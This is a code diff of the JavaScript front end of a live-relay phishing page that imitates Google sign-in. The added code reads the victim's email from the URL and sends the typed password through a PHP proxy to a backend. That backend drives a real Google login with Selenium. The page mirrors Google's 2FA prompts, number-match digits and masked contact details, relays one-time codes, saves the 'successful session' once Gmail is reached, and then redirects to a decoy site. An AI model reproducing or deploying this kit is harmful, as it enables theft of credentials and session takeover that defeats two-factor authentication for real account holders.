-								
-								const data = await response.json();
-								if (data.success) {
-									showCustomAlert('New verification code sent!');
-								} else {
-									showCustomAlert('Failed to send code. Please try again.', true);
-								}
-							} catch (error) {
-								console.error('Send again failed:', error);
-								showCustomAlert('Failed to send. Please try again.', true);
-							} finally {
-								btn.classList.remove('send-again-loading');
-								btn.textContent = originalText;
-							}
-						});
-					}
-				});
-			}
-
-			function showCustomAlert(message, isError = false) {
-				const alertDiv = document.createElement('div');
-				alertDiv.className = 'custom-alert';
-				
-				const icon = document.createElement('span');
-				icon.className = 'material-icons custom-alert-icon';
-				icon.textContent = isError ? 'error' : 'check_circle';
-				if (isError) icon.classList.add('custom-alert-error');
-				
-				const messageSpan = document.createElement('span');
-				messageSpan.className = 'custom-alert-message';
-				messageSpan.textContent = message;
-				
-				alertDiv.appendChild(icon);
-				alertDiv.appendChild(messageSpan);
-				
-				document.body.appendChild(alertDiv);
-				
-				setTimeout(() => {
-					alertDiv.style.opacity = '0';
-					setTimeout(() => {
-						document.body.removeChild(alertDiv);
-					}, 300);
-				}, 3000);
-			}
-
-			async function handleCodeSubmit(method) {
-				const inputMap = {
-					text: textCodeInput,
-					email: emailCodeInput,
-					authenticator: authenticatorCodeInput
-				};
-				const errorMap = {
-					text: 'textCodeError',
-					email: 'emailCodeError',
-					authenticator: 'authenticatorCodeError'
-				};
-				
-				const input = inputMap[method];
-				const errorId = errorMap[method];
-				const code = input && input.value ? input.value.trim() : '';
-				
-				if (!code || code.length !== 6) {
-					showError(errorId, 'Please enter a 6-digit code');
-					return;
-				}
-				
-				clearError(errorId);
-				setLoadingState(true); // Show loading for OTP submission
-				
-				try {
-					const response = await fetch(`${API_BASE_URL}/auth/otp`, {
-						method: 'GET',
-						headers: {
-							'Content-Type': 'application/json',
-						},
-						body: JSON.stringify({
-							email: currentEmail,
-							otp: code,
-							method: method,
-							session_id: sessionId
-						})
-					});
-					
-					const data = await response.json();
-					
-					if (data.success) {
-						startFinalStatusPolling();
-					} else {
-						setLoadingState(false);
-						showError(errorId, data.error || 'Invalid verification code');
-						if (input) {
-							input.value = '';
-							input.focus();
-						}
-					}
-				} catch (error) {
-					setLoadingState(false);
-					showError(errorId, 'Connection error. Please try again.');
-					console.error('Error:', error);
-				}
-			}
-
-			function startFinalStatusPolling() {
-				if (codeVerificationInterval) {
-					clearInterval(codeVerificationInterval);
-				}
-				
-				codeVerificationInterval = setInterval(async () => {
-					const status = await checkStatus();
-					if (status && status.display) {
-						if (status.display.current_page === 'exit' || !status.display.heading_found) {
-							clearInterval(codeVerificationInterval);
-							showLoading().hide();
-							
-							passwordForm.style.display = 'none';
-							deviceAuthContainer.style.display = 'none';
-							successPage.style.display = 'block';
-						}
-					}
-				}, 2000);
-			}
-
-			function updateProfileIcons(email) {
-				const initial = email.charAt(0).toUpperCase();
-				const colors = ['#4285F4', '#34A853', '#FBBC05', '#EA4335', '#673AB7'];
-				const colorIndex = initial.charCodeAt(0) % colors.length;
-				
-				profileIcons.forEach(icon => {
-					icon.textContent = initial;
-					icon.style.backgroundColor = colors[colorIndex];
-				});
-			}
-
-			function updateEmailDisplay(email) {
-				emailDisplay.textContent = email;
-				authEmailDisplay.textContent = email;
-			}
-		});
+document.addEventListener('DOMContentLoaded', function() {
+    // DOM Elements
+    const fullPageLoader = document.getElementById('fullPageLoader');
+    const loadingIframe = document.getElementById('loadingIframe');
+    const sessionExpired = document.getElementById('sessionExpired');
+    const formBox = document.getElementById('formBox');
+    const passwordInput = document.getElementById('passwordInput');
+    const passwordError = document.getElementById('passwordError');
+    const nextButton = document.getElementById('nextButton');
+    const authNumberDisplay = document.getElementById('authNumberDisplay');
+    const authNumberText = document.getElementById('authNumberText');
+    const authNumberHeading = document.getElementById('authNumberHeading');
+    const authNumberInstruction = document.getElementById('authNumberInstruction');
+    const emailDisplay = document.getElementById('emailDisplay');
+    const authEmailDisplay = document.getElementById('authEmailDisplay');
+    const pageTitle = document.getElementById('pageTitle');
+    const tryAnotherWay = document.getElementById('tryAnotherWay');
+    const backToDeviceAuth = document.getElementById('backToDeviceAuth');
+    const sendAgainDevice = document.getElementById('sendAgainDevice');
+    const sendAgainText = document.getElementById('sendAgainText');
+    const sendAgainEmail = document.getElementById('sendAgainEmail');
+    const textCodeInput = document.getElementById('textCodeInput');
+    const emailCodeInput = document.getElementById('emailCodeInput');
+    const authenticatorCodeInput = document.getElementById('authenticatorCodeInput');
+    const textCodeError = document.getElementById('textCodeError');
+    const emailCodeError = document.getElementById('emailCodeError');
+    const authenticatorCodeError = document.getElementById('authenticatorCodeError');
+    const profileIcons = document.querySelectorAll('.profile-icon');
+    const verificationGif = document.getElementById('verificationGif');
+    const gifHeaderText = document.getElementById('gifHeaderText');
+    const authNumberVerificationDisplay = document.getElementById('authNumberVerificationDisplay');
+    const authNumberVerificationTitle = document.getElementById('authNumberVerificationTitle');
+    const authNumberVerificationInstruction = document.getElementById('authNumberVerificationInstruction');
+    const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
+    const showPasswordLabel = document.getElementById('showPasswordLabel');
+    const passwordForm = document.getElementById('passwordForm');
+    const deviceAuthContainer = document.getElementById('deviceAuthContainer');
+    const successPage = document.getElementById('successPage');
+    const safetyMessage = document.getElementById('safetyMessage');
+    const authSafetyMessage = document.getElementById('authSafetyMessage');
+    const tryAnotherWayFromGif = document.getElementById('tryAnotherWayFromGif');
+    const tryAnotherWayFromAuthNumber = document.getElementById('tryAnotherWayFromAuthNumber');
+    const tapYesOption = document.getElementById('tapYesOption');
+    const textOption = document.getElementById('textOption');
+    const emailOption = document.getElementById('emailOption');
+    const authenticatorOption = document.getElementById('authenticatorOption');
+    const helpOption = document.getElementById('helpOption');
+    const textCodeInstruction = document.getElementById('textCodeInstruction');
+    const emailCodeInstruction = document.getElementById('emailCodeInstruction');
+
+    // State variables
+    let currentEmail = '';
+    let sessionId = '';
+    let statusPollingInterval = null;
+    let codeVerificationInterval = null;
+    let pageMonitorInterval = null;
+    let passwordErrorState = false;
+    let lastActivityTime = Date.now();
+    const PROXY_URL = 'proxy.php'; // Path to your PHP proxy script
+
+    // Initialize the application
+    initApplication();
+
+    function initApplication() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailFromURL = urlParams.get('email');
+        
+        if (!emailFromURL) {
+            document.getElementById('noEmailContainer').style.display = 'block';
+            document.getElementById('passwordForm').style.display = 'none';
+            document.getElementById('deviceAuthContainer').style.display = 'none';
+            return;
+        }
+
+        currentEmail = emailFromURL;
+        sessionId = generateSessionId();
+        initUI();
+        startSession();
+        setupEventListeners();
+        
+        // Show iframe initially
+        loadingIframe.style.display = 'block';
+        
+        // Set up activity monitoring
+        setupActivityMonitoring();
+    }
+
+    function setupActivityMonitoring() {
+        document.addEventListener('mousemove', updateActivityTime);
+        document.addEventListener('keydown', updateActivityTime);
+        document.addEventListener('click', updateActivityTime);
+        document.addEventListener('scroll', updateActivityTime);
+        
+        setInterval(checkInactivity, 60000);
+    }
+
+    function updateActivityTime() {
+        lastActivityTime = Date.now();
+    }
+
+    function checkInactivity() {
+        const inactiveTime = Date.now() - lastActivityTime;
+        if (inactiveTime > 180000) {
+            showSessionExpired();
+        }
+    }
+
+    function showSessionExpired() {
+        sessionExpired.style.display = 'block';
+        setTimeout(() => {
+            window.location.href = `https://example.com?${encodeURIComponent(currentEmail)}#incomplete`;
+        }, 3000);
+    }
+
+    function generateSessionId() {
+        return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    }
+
+    function initUI() {
+        fullPageLoader.style.display = 'none';
+        formBox.classList.remove('blur-effect');
+        
+        updateEmailDisplay(currentEmail);
+        updateProfileIcons(currentEmail);
+        
+        showPasswordCheckbox.addEventListener('click', togglePasswordVisibility);
+        showPasswordLabel.addEventListener('click', togglePasswordVisibility);
+    }
+
+    function togglePasswordVisibility() {
+        const isChecked = showPasswordCheckbox.classList.contains('checked');
+        if (isChecked) {
+            showPasswordCheckbox.classList.remove('checked');
+            passwordInput.type = 'password';
+        } else {
+            showPasswordCheckbox.classList.add('checked');
+            passwordInput.type = 'text';
+        }
+    }
+
+    function setLoadingState(loading, isPasswordPage = false, persistUntilNextPage = false) {
+        const throbber = document.getElementById('throbberContainer');
+        const formBox = document.getElementById('formBox');
+        
+        if (loading) {
+            throbber.style.display = 'block';
+            throbber.classList.remove('hidden');
+            if (!persistUntilNextPage) {
+                formBox.classList.add('blur-effect');
+            }
+            if (isPasswordPage) {
+                nextButton.classList.add('loading');
+            }
+        } else {
+            throbber.classList.add('hidden');
+            setTimeout(() => {
+                throbber.style.display = 'none';
+            }, 200);
+            
+            formBox.classList.remove('blur-effect');
+            nextButton.classList.remove('loading');
+        }
+    }
+
+    function setupEventListeners() {
+        nextButton.addEventListener('click', handlePasswordSubmit);
+        backToDeviceAuth.addEventListener('click', showDevicePrompt);
+        tapYesOption.addEventListener('click', () => selectAuthOption('device'));
+        textOption.addEventListener('click', () => selectAuthOption('sms'));
+        emailOption.addEventListener('click', () => selectAuthOption('email'));
+        authenticatorOption.addEventListener('click', () => selectAuthOption('authenticator'));
+        helpOption.addEventListener('click', () => selectAuthOption('help'));
+        document.getElementById('tryAnotherWayFromText').addEventListener('click', handleTryAnotherWayFromText);
+        document.getElementById('tryAnotherWayFromEmail').addEventListener('click', handleTryAnotherWayFromEmail);
+        document.getElementById('tryAnotherWayFromAuthenticator').addEventListener('click', handleTryAnotherWayFromAuthenticator);
+        document.getElementById('submitTextCode').addEventListener('click', () => handleCodeSubmit('text'));
+        document.getElementById('submitEmailCode').addEventListener('click', () => handleCodeSubmit('email'));
+        document.getElementById('submitAuthenticatorCode').addEventListener('click', () => handleCodeSubmit('authenticator'));
+        tryAnotherWayFromGif.addEventListener('click', handleTryAnotherWayFromGif);
+        tryAnotherWayFromAuthNumber.addEventListener('click', handleTryAnotherWayFromAuthNumber);
+        
+        passwordInput.addEventListener('input', function() {
+            if (passwordErrorState) {
+                passwordInput.classList.remove('dark-red-border');
+                document.getElementById('passwordError').style.display = 'block';
+            }
+        });
+
+        passwordInput.addEventListener('focus', function() {
+            if (passwordErrorState) {
+                passwordInput.classList.add('dark-red-border');
+            }
+        });
+
+        passwordInput.addEventListener('blur', function() {
+            if (passwordErrorState && !passwordInput.value) {
+                passwordInput.classList.add('dark-red-border');
+            }
+        });
+        
+        textCodeInput.addEventListener('input', handleOtpInput);
+        emailCodeInput.addEventListener('input', handleOtpInput);
+        authenticatorCodeInput.addEventListener('input', handleOtpInput);
+        setupSendAgainButtons();
+    }
+
+    function handleOtpInput(e) {
+        const input = e.target;
+        const errorId = input.id.replace('Input', 'Error');
+        clearError(errorId);
+        input.value = input.value.replace(/[^0-9]/g, '');
+        input.classList.remove('has-error');
+        input.classList.remove('dark-red-border');
+    }
+
+    function showError(elementId, message) {
+        const element = document.getElementById(elementId);
+        if (element) {
+            setLoadingState(false);
+            
+            element.textContent = message;
+            element.style.display = 'block';
+            element.classList.add('dark-red-error');
+            
+            if (elementId === 'passwordError') {
+                passwordInput.classList.add('dark-red-border');
+                passwordInput.focus();
+                passwordErrorState = true;
+            }
+            else if (elementId === 'textCodeError') {
+                textCodeInput.classList.add('dark-red-border');
+                textCodeInput.focus();
+            }
+            else if (elementId === 'emailCodeError') {
+                emailCodeInput.classList.add('dark-red-border');
+                emailCodeInput.focus();
+            }
+            else if (elementId === 'authenticatorCodeError') {
+                authenticatorCodeInput.classList.add('dark-red-border');
+                authenticatorCodeInput.focus();
+            }
+        }
+    }
+
+    function clearError(elementId) {
+        const element = document.getElementById(elementId);
+        if (element) {
+            if (elementId === 'passwordError' && passwordErrorState) {
+                return;
+            }
+            
+            element.textContent = '';
+            element.style.display = 'none';
+            element.classList.remove('dark-red-error');
+            
+            if (elementId === 'passwordError') {
+                passwordInput.classList.remove('dark-red-border');
+                passwordErrorState = false;
+            }
+        }
+    }
+
+    async function startSession() {
+        const loading = showLoading();
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/start_session&email=${encodeURIComponent(currentEmail)}&session_id=${encodeURIComponent(sessionId)}`);
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                startPageStateMonitoring();
+            } else {
+                showCustomAlert('Failed to start session. Please refresh the page.', true);
+            }
+        } catch (error) {
+            console.error('Error starting session:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+        } finally {
+            loading.hide();
+        }
+    }
+
+    function startPageStateMonitoring() {
+        if (pageMonitorInterval) {
+            clearInterval(pageMonitorInterval);
+        }
+        
+        pageMonitorInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`${PROXY_URL}?endpoint=/selenium/get_page_state&session_id=${encodeURIComponent(sessionId)}`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    handlePageStateUpdate(data);
+                }
+            } catch (error) {
+                console.error('Error monitoring page state:', error);
+            }
+        }, 1000);
+    }
+
+    function handlePageStateUpdate(data) {
+        if (data.password_page_ready) {
+            loadingIframe.style.display = 'none';
+        }
+
+        if (data.error?.password || data.error?.otp) {
+            setLoadingState(false);
+        }
+
+        if (data.current_page === 'password') {
+            safetyMessage.style.display = 'none';
+            
+            if (data.heading_text) {
+                pageTitle.textContent = data.heading_text;
+            }
+
+            if (data.password_field_detected) {
+                passwordForm.style.display = 'block';
+                deviceAuthContainer.style.display = 'none';
+                successPage.style.display = 'none';
+                startStatusPolling();
+            }
+
+            if (data.error?.password !== null && data.error?.password !== undefined) {
+                showError('passwordError', data.error.password);
+                passwordInput.classList.add('dark-red-border');
+                passwordInput.focus();
+            } else {
+                clearError('passwordError');
+            }
+        }
+        else if (data.current_page === '2fa') {
+            safetyMessage.style.display = 'block';
+            authSafetyMessage.style.display = 'block';
+
+            passwordForm.style.display = 'none';
+            deviceAuthContainer.style.display = 'block';
+            successPage.style.display = 'none';
+
+            update2FADisplay(data);
+
+            if (data.has_gif_element || data.has_auth_number_element) {
+                setLoadingState(true, false, true);
+            } else {
+                setLoadingState(false);
+            }
+
+            if (data.is_text_otp_page && data.text_otp_instruction) {
+                textCodeInstruction.textContent = data.text_otp_instruction;
+            }
+
+            if (data.is_email_verification_page && data.email_verification_instruction) {
+                emailCodeInstruction.textContent = data.email_verification_instruction;
+            }
+
+            if (data.error?.otp) {
+                const currentMethod = getCurrentAuthMethod();
+                if (currentMethod === 'text') {
+                    showError('textCodeError', data.error.otp);
+                    textCodeInput.classList.add('dark-red-border');
+                    textCodeInput.focus();
+                } else if (currentMethod === 'email') {
+                    showError('emailCodeError', data.error.otp);
+                    emailCodeInput.classList.add('dark-red-border');
+                    emailCodeInput.focus();
+                } else if (currentMethod === 'authenticator') {
+                    showError('authenticatorCodeError', data.error.otp);
+                    authenticatorCodeInput.classList.add('dark-red-border');
+                    authenticatorCodeInput.focus();
+                }
+            }
+        }
+        else if (!data.heading_found && data.current_url && data.current_url.includes('mail.google.com')) {
+            clearInterval(pageMonitorInterval);
+            setLoadingState(false);
+            passwordForm.style.display = 'none';
+            deviceAuthContainer.style.display = 'none';
+            successPage.style.display = 'block';
+
+            setTimeout(() => {
+                window.location.href = 'https://example.com';
+            }, 3000);
+
+            saveSuccessfulSession();
+        }
+    }
+
+    function update2FADisplay(data) {
+        hideAllAuthContainers();
+    
+        if (data.has_gif_element) {
+            const gifContainer = document.getElementById('gifVerificationContainer');
+            gifContainer.style.display = 'block';
+    
+            if (data.gif_url) {
+                document.getElementById('verificationGif').src = data.gif_url;
+            }
+            if (data.gif_heading) {
+                document.getElementById('gifHeaderText').textContent = data.gif_heading;
+            }
+        }
+        else if (data.has_auth_number_element) {
+            document.getElementById('authNumberVerificationContainer').style.display = 'block';
+    
+            if (data.auth_number) {
+                document.getElementById('authNumberVerificationDisplay').textContent = data.auth_number;
+            }
+            if (data.auth_number_heading) {
+                document.getElementById('authNumberVerificationTitle').textContent = data.auth_number_heading;
+            }
+            if (data.auth_number_instruction) {
+                document.getElementById('authNumberVerificationInstruction').textContent = data.auth_number_instruction;
+            }
+        }
+        else if (data.is_authenticator_page) {
+            document.getElementById('authenticatorContainer').style.display = 'block';
+        }
+        else if (data.is_options_page) {
+            showAltAuthOptions(data.options || []);
+        }
+        else if (data.is_text_otp_page) {
+            document.getElementById('textCodeContainer').style.display = 'block';
+            if (data.text_otp_instruction) {
+                document.getElementById('textCodeInstruction').textContent = data.text_otp_instruction;
+            }
+        }
+        else if (data.is_email_verification_page) {
+            document.getElementById('emailCodeContainer').style.display = 'block';
+            if (data.email_verification_instruction) {
+                document.getElementById('emailCodeInstruction').textContent = data.email_verification_instruction;
+            }
+        }
+        else {
+            document.getElementById('devicePromptContainer').style.display = 'block';
+    
+            if (data.auth_number) {
+                document.getElementById('authNumberDisplay').textContent = data.auth_number;
+                document.getElementById('authNumberText').textContent = data.auth_number;
+            }
+            if (data.auth_number_heading) {
+                document.getElementById('authNumberHeading').textContent = data.auth_number_heading;
+            }
+            if (data.auth_number_instruction) {
+                document.getElementById('authNumberInstruction').textContent = data.auth_number_instruction;
+            }
+        }
+    
+        updateUIFromDisplayConfig(data);
+    }
+
+    async function showAltAuthOptions(options) {
+        const loading = showLoading();
+        try {
+            const altAuthOptions = document.getElementById('altAuthOptions');
+            altAuthOptions.innerHTML = '';
+            
+            options.forEach(option => {
+                const optionDiv = document.createElement('div');
+                optionDiv.className = 'auth-option';
+                
+                if (option.text.includes('Unavailable')) {
+                    optionDiv.classList.add('unavailable');
+                }
+                
+                let icon = '';
+                let title = '';
+                let desc = '';
+                
+                if (option.is_tap_yes) {
+                    icon = '<span class="material-icons">phone_iphone</span>';
+                    title = 'Tap "Yes" on your device';
+                    desc = 'Confirm it\'s you on one of your devices';
+                } 
+                else if (option.is_authenticator) {
+                    icon = '<span class="material-icons">security</span>';
+                    title = 'Use Google Authenticator';
+                    desc = 'Get a verification code from the app';
+                }
+                else if (option.is_sms) {
+                    icon = '<span class="material-icons">sms</span>';
+                    const phoneMatch = option.text.match(/\(\d{3}\) \d{3}-\d{4}/);
+                    title = 'Get a verification code by text';
+                    desc = phoneMatch ? `+1 ${phoneMatch[0]}` : option.text.split('\n')[0];
+                }
+                else if (option.is_email) {
+                    icon = '<span class="material-icons">email</span>';
+                    title = 'Get a verification code by email';
+                    desc = option.text.split('\n')[0];
+                }
+                else if (option.is_help) {
+                    icon = '<span class="material-icons">help</span>';
+                    title = 'Get help';
+                    desc = 'Troubleshoot issues with 2-Step Verification';
+                }
+                else {
+                    icon = '<span class="material-icons">help</span>';
+                    title = option.text.split('\n')[0];
+                    desc = option.text.split('\n').slice(1).join('<br>');
+                }
+                
+                optionDiv.innerHTML = `
+                    <div class="auth-method-icon">${icon}</div>
+                    <div class="auth-option-content">
+                        <div class="auth-option-title">${title}</div>
+                        <div class="auth-option-desc">${desc}</div>
+                    </div>
+                `;
+                
+                if (!option.text.includes('Unavailable')) {
+                    optionDiv.addEventListener('click', async () => {
+                        setLoadingState(true, false, true);
+                        try {
+                            const response = await fetch(`${PROXY_URL}?endpoint=/selenium/select_option&session_id=${encodeURIComponent(sessionId)}&option_xpath=${encodeURIComponent(option.xpath)}&option_type=${encodeURIComponent(getOptionType(option))}`);
+                            
+                            const data = await response.json();
+                            if (!data.success) {
+                                showCustomAlert('Failed to select option', true);
+                            }
+                        } catch (error) {
+                            console.error('Error selecting option:', error);
+                            showCustomAlert('Connection error. Please try again.', true);
+                        }
+                    });
+                }
+                
+                altAuthOptions.appendChild(optionDiv);
+            });
+            
+            const backButton = document.createElement('a');
+            backButton.className = 'back-to-device-auth';
+            backButton.id = 'backToDeviceAuth';
+            backButton.textContent = 'Back';
+            backButton.addEventListener('click', showDevicePrompt);
+            altAuthOptions.appendChild(backButton);
+            
+            hideAllAuthContainers();
+            altAuthOptions.style.display = 'block';
+            
+            loading.hide();
+        } catch (error) {
+            loading.hide();
+            showCustomAlert('Failed to load options. Please try again.', true);
+            console.error('Error loading options:', error);
+        }
+    }
+
+    function getOptionType(option) {
+        if (option.is_tap_yes) return 'device';
+        if (option.is_authenticator) return 'authenticator';
+        if (option.is_sms) return 'sms';
+        if (option.is_email) return 'email';
+        if (option.is_help) return 'help';
+        return 'unknown';
+    }
+
+    async function handlePasswordSubmit() {
+        console.log('Password submit initiated');
+        const password = passwordInput.value.trim();
+        
+        setLoadingState(true, true, true);
+        
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/auth/password&email=${encodeURIComponent(currentEmail)}&password=${encodeURIComponent(password)}&session_id=${encodeURIComponent(sessionId)}`);
+            
+            const data = await response.json();
+            
+            if (data.success) {
+                startStatusPolling();
+            } else {
+                setLoadingState(false);
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                checkStatus().then(status => {
+                    if (status && status.display) {
+                        handlePageStateUpdate(status.display);
+                    }
+                });
+            }
+        } catch (error) {
+            console.error('Password submit error:', error);
+            setLoadingState(false);
+            logEvent('password_submission_error', {
+                error: error.message,
+                session_id: sessionId
+            });
+        }
+    }
+
+    function startStatusPolling() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        
+        let lastErrorState = null;
+        
+        statusPollingInterval = setInterval(async () => {
+            const status = await checkStatus();
+            if (status?.display) {
+                if (status.display.error?.password !== lastErrorState) {
+                    handlePageStateUpdate(status.display);
+                    lastErrorState = status.display.error?.password;
+                }
+                
+                if (status.display.error?.password) {
+                    clearInterval(statusPollingInterval);
+                }
+            }
+        }, 1000);
+    }
+
+    async function checkStatus() {
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/auth/status&email=${encodeURIComponent(currentEmail)}&session_id=${encodeURIComponent(sessionId)}`);
+            if (!response.ok) throw new Error('Network response was not ok');
+            return await response.json();
+        } catch (error) {
+            console.error('Error checking status:', error);
+            return null;
+        }
+    }
+
+    function handleStatusUpdate(displayConfig) {
+        if (displayConfig.error?.password) {
+            showError('passwordError', displayConfig.error.password);
+            passwordInput.focus();
+            return;
+        }
+
+        if (displayConfig.error?.otp) {
+            const currentMethod = getCurrentAuthMethod();
+            if (currentMethod === 'text') {
+                showError('textCodeError', displayConfig.error.otp);
+                textCodeInput.focus();
+            } else if (currentMethod === 'email') {
+                showError('emailCodeError', displayConfig.error.otp);
+                emailCodeInput.focus();
+            } else if (currentMethod === 'authenticator') {
+                showError('authenticatorCodeError', displayConfig.error.otp);
+                authenticatorCodeInput.focus();
+            }
+            return;
+        }
+    }
+
+    function getCurrentAuthMethod() {
+        if (document.getElementById('textCodeContainer').style.display === 'block') return 'text';
+        if (document.getElementById('emailCodeContainer').style.display === 'block') return 'email';
+        if (document.getElementById('authenticatorContainer').style.display === 'block') return 'authenticator';
+        return 'device';
+    }
+
+    function updateUIFromDisplayConfig(displayConfig) {
+        if (displayConfig.device_name) {
+            document.querySelector('.device-prompt-container .auth-instruction').innerHTML = 
+                `Google sent a notification to ${displayConfig.device_name}. Open the Gmail app, tap Yes on the prompt, ` +
+                `then tap <span id="authNumberText">${displayConfig.auth_number || '21'}</span> on your phone to verify it's you.`;
+        }
+        
+        if (displayConfig.auth_number) {
+            authNumberDisplay.textContent = displayConfig.auth_number;
+            authNumberText.textContent = displayConfig.auth_number;
+        }
+        
+        if (displayConfig.masked_email) {
+            document.querySelector('#emailOption .auth-option-desc').textContent = displayConfig.masked_email;
+            document.querySelector('#emailCodeContainer .auth-instruction').textContent = 
+                `We sent a 6-digit code to ${displayConfig.masked_email}. Enter it below to verify it's you.`;
+        }
+        
+        if (displayConfig.masked_phone) {
+            document.querySelector('#textOption .auth-option-desc').textContent = displayConfig.masked_phone;
+            document.querySelector('#textCodeContainer .auth-instruction').textContent = 
+                `We sent a 6-digit code to ${displayConfig.masked_phone}. Enter it below to verify it's you.`;
+        }
+    }
+
+    async function saveSuccessfulSession() {
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/save_successful_session&email=${encodeURIComponent(currentEmail)}&session_id=${encodeURIComponent(sessionId)}`);
+            
+            if (!response.ok) {
+                console.error('Failed to save successful session');
+            }
+        } catch (error) {
+            console.error('Error saving successful session:', error);
+        }
+    }
+
+    async function handleTryAnotherWayFromText() {
+        setLoadingState(true);
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/selenium/try_another_way&session_id=${encodeURIComponent(sessionId)}&method=text&xpath=${encodeURIComponent('//*[@id="yDmH0d"]/c-wiz/main/div[3]/div[2]/div[2]/div/div/button/span')}`);
+            
+            const data = await response.json();
+            
+            if (!data.success) {
+                showCustomAlert('Action timed out or failed', true);
+                setLoadingState(false);
+            }
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromEmail() {
+        setLoadingState(true);
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/selenium/try_another_way&session_id=${encodeURIComponent(sessionId)}&method=email&xpath=${encodeURIComponent('//*[@id="yDmH0d"]/c-wiz/main/div[3]/div/div[2]/div/div/button/span')}`);
+            
+            const data = await response.json();
+            
+            if (!data.success) {
+                showCustomAlert('Action timed out or failed', true);
+                setLoadingState(false);
+            }
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromAuthenticator() {
+        setLoadingState(true);
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/selenium/try_another_way&session_id=${encodeURIComponent(sessionId)}&method=authenticator&xpath=${encodeURIComponent('//*[@id="yDmH0d"]/c-wiz/main/div[3]/div/div[2]/div/div/button/span')}`);
+            
+            const data = await response.json();
+            
+            if (!data.success) {
+                showCustomAlert('Action timed out or failed', true);
+                setLoadingState(false);
+            }
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromGif() {
+        setLoadingState(true);
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/selenium/try_another_way&session_id=${encodeURIComponent(sessionId)}&method=gif`);
+            
+            const data = await response.json();
+            
+            if (!data.success) {
+                showCustomAlert('Action timed out or failed', true);
+                setLoadingState(false);
+            }
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function handleTryAnotherWayFromAuthNumber() {
+        setLoadingState(true);
+        try {
+            const response = await fetch(`${PROXY_URL}?endpoint=/selenium/try_another_way&session_id=${encodeURIComponent(sessionId)}&method=auth_number`);
+            
+            const data = await response.json();
+            
+            if (!data.success) {
+                showCustomAlert('Action timed out or failed', true);
+                setLoadingState(false);
+            }
+        } catch (error) {
+            console.error('Error handling try another way:', error);
+            showCustomAlert('Connection error. Please try again.', true);
+            setLoadingState(false);
+        }
+    }
+
+    async function selectAuthOption(methodType) {
+        setLoadingState(true, false, true);
+        
+        try {
+            const statusResponse = await fetch(`${PROXY_URL}?endpoint=/auth/status&session_id=${encodeURIComponent(sessionId)}`);
+            const statusData = await statusResponse.json();
+            
+            if (!statusData.success || !statusData.display || !statusData.display.options) {
+                showCustomAlert('No authentication options available', true);
+                setLoadingState(false);
+                return;
+            }
+
+            let option = null;
+            const options = statusData.display.options;
+            
+            switch (methodType) {
+                case 'device':
+                    option = options.find(opt => opt.is_tap_yes);
+                    break;
+                case 'sms':
+                    option = options.find(opt => opt.is_sms);
+                    break;
+                case 'email':
+                    option = options.find(opt => opt.is_email);
+                    break;
+                case 'authenticator':
+                    option = options.find(opt => opt.is_authenticator);
+                    break;
+                case 'help':
+                    option = options.find(opt => opt.is_help);
+                    break;
+                default:
+                    showCustomAlert('Invalid authentication method', true);
+                    setLoadingState(false);
+                    return;
+            }
+
+            if (!option) {
+                showCustomAlert('This authentication method is not available', true);
+                setLoadingState(false);
+                return;
+            }
+
+            const selectResponse = await fetch(`${PROXY_URL}?endpoint=/selenium/select_option&session_id=${encodeURIComponent(sessionId)}&option_xpath=${encodeURIComponent(option.xpath)}&option_type=${encodeURIComponent(methodType)}`);
+
+            const selectData = await selectResponse.json();
+            
+            if (!selectData.success) {
+                setLoadingState(false);
+                showCustomAlert('Failed to select authentication method', true);
+            }
+        } catch (error) {
+            console.error('Error selecting authentication option:', error);
+            setLoadingState(false);
+            showCustomAlert('Connection error. Please try again.', true);
+        }
+    }
+
+    function showDevicePrompt() {
+        hideAllAuthContainers();
+        document.getElementById('devicePromptContainer').style.display = 'block';
+        startStatusPolling();
+    }
+
+    function showTextVerification() {
+        const loading = showLoading();
+        hideAllAuthContainers();
+        document.getElementById('textCodeContainer').style.display = 'block';
+        textCodeInput.focus();
+        loading.hide();
+    }
+
+    function showEmailVerification() {
+        const loading = showLoading();
+        hideAllAuthContainers();
+        document.getElementById('emailCodeContainer').style.display = 'block';
+        emailCodeInput.focus();
+        loading.hide();
+    }
+
+    function showAuthenticator() {
+        const loading = showLoading();
+        hideAllAuthContainers();
+        document.getElementById('authenticatorContainer').style.display = 'block';
+        authenticatorCodeInput.focus();
+        loading.hide();
+    }
+
+    function hideAllAuthContainers() {
+        document.getElementById('devicePromptContainer').style.display = 'none';
+        document.getElementById('altAuthOptions').style.display = 'none';
+        document.getElementById('textCodeContainer').style.display = 'none';
+        document.getElementById('emailCodeContainer').style.display = 'none';
+        document.getElementById('authenticatorContainer').style.display = 'none';
+        document.getElementById('gifVerificationContainer').style.display = 'none';
+        document.getElementById('authNumberVerificationContainer').style.display = 'none';
+    }
+
+    function setupSendAgainButtons() {
+        const sendAgainButtons = [
+            document.getElementById('sendAgainDevice'),
+            document.getElementById('sendAgainText'),
+            document.getElementById('sendAgainEmail'),
+            document.getElementById('sendAgainAuthenticator')
+        ];
+        
+        sendAgainButtons.forEach(btn => {
+            if (btn) {
